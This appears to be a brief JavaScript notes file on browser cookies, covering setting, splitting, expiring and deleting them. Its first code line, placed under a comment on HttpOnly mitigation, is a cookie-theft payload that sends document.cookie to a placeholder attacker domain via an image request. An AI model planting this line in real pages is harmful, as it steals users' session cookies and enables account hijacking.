// cookie get ( The HTTPOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript.)
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

// set cookie
document.cookie = "key1=value1;key2=value2;expires=date";

// Get all the cookies pairs in an array
cookiearray = allcookies.split(';');

<script type="text/javascript">
// set cookie with date
function WriteCookie()
{
  var now = new Date();
  now.setMonth( now.getMonth() + 1 );
  cookievalue = escape(document.myform.customer.value) + ";"
  document.cookie="name=" + cookievalue;
  document.cookie = "expires=" + now.toUTCString() + ";"
  document.write ("Setting Cookies : " + "name=" + cookievalue );
  }

// deete cookie set expires date to month behind the current date  
// now.setMonth( now.getMonth() - 1 );
</script>
